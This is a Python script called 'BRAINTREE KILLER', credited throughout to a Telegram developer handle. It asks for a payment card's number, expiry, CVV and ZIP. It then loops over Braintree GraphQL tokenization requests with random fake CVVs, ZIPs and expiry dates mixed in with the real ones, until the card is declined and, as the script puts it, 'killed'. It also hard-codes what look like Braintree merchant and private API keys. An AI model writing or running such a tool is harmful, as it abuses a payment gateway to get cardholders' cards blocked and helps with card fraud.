# =========================================================
# 👑 DEVELOPER TELEGRAM: @tgekaiva
# 👑 SCRIPT: BRAINTREE KILLER (LIVE API FLOW)
# 👑 AUTHOR / DEV: @tgekaiva
# =========================================================

# Developer Telegram: @tgekaiva - Required imports
import os
import requests
import time
import random
import threading
from base64 import b64encode

# Developer Telegram: @tgekaiva - User input prompt
print("=" * 50)
print("[$] BRAINTREE CARD KILLER (LIVE API FLOW)")
print("[$] Developer Telegram: @tgekaiva")
print("=" * 50)

card_number = input("Enter Card Number: ")
exp_month = input("Enter Expiry Month (MM): ")
exp_year = input("Enter Expiry Year (YYYY): ")
cvv_real = input("Enter CVV: ")
zip_real = input("Enter ZIP Code: ")

# Developer Telegram: @tgekaiva - Braintree credentials & auth
BT_MERCHANT_ID = os.environ.get("BT_MERCHANT_ID", "bdwz9z4gc6nv8f64")
BT_PUBLIC_KEY = os.environ.get("BT_PUBLIC_KEY", "xj9zfs349qy4z8jh")
BT_PRIVATE_KEY = os.environ.get("BT_PRIVATE_KEY", "d39e8c36ef9e237c16e41169b110f177")

auth_string = f"{BT_PUBLIC_KEY}:{BT_PRIVATE_KEY}"
encoded_auth = b64encode(auth_string.encode()).decode()

headers = {
    "Authorization": f"Basic {encoded_auth}",
    "Content-Type": "application/json"
}

gateway_url = "https://payments.sandbox.braintree-api.com/graphql"

loading = True
start_time = time.time()

# Developer Telegram: @tgekaiva - Loading animation
def animate_loading():
    bar = ["[#####]", "[#### ]", "[###  ]", "[##   ]", "[#    ]"]
    while loading:
        for stage in bar:
            print(f"\rProcessing {stage} | Dev: @tgekaiva", end="", flush=True)
            time.sleep(0.3)

# Developer Telegram: @tgekaiva - Charge tokenization request
def send_braintree_charge(cvv, zip_code, month, year):
    payload = {
        "query": """
        mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
          tokenizeCreditCard(input: $input) {
            paymentMethod {
              id
            }
          }
        }
        """,
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": month,
                    "expirationYear": year,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": zip_code
                    }
                }
            }
        }
    }

    try:
        response = requests.post(gateway_url, json=payload, headers=headers, timeout=10)
        data = response.json()

        if "errors" in data:
            return "declined"
        elif "paymentMethod" in data.get("data", {}).get("tokenizeCreditCard", {}):
            return "approved"
        else:
            return "error"

    except Exception as e:
        return "timeout"

# Developer Telegram: @tgekaiva - Main Killer logic
def kill_card():
    global loading
    attempt = 0
    killed = False

    while not killed:
        for _ in range(5):  # Braintree can fail after 4–6
            fake_cvv = str(random.randint(100, 999))
            fake_zip = str(random.randint(10000, 99999))
            fake_month = str(random.randint(1, 12)).zfill(2)
            fake_year = str(random.randint(2025, 2030))

            attempt += 1
            result = send_braintree_charge(fake_cvv, fake_zip, fake_month, fake_year)
            print(f"\n[Attempt {attempt}] Fake charge: {result} | Dev: @tgekaiva")

        # Real charge
        result = send_braintree_charge(cvv_real, zip_real, exp_month, exp_year)

        if result == "declined":
            killed = True
        else:
            print("\n[+] Card still alive... Retrying! | Dev: @tgekaiva\n")

    loading = False
    duration = round(time.time() - start_time, 2)
    print(f"\n[X] CARD SUCCESSFULLY KILLED! [Time: {duration}s] | Developer Telegram: @tgekaiva")

# Developer Telegram: @tgekaiva - Thread execution
t1 = threading.Thread(target=animate_loading)
t2 = threading.Thread(target=kill_card)

t1.start()
t2.start()

t2.join()

loading = False
t1.join()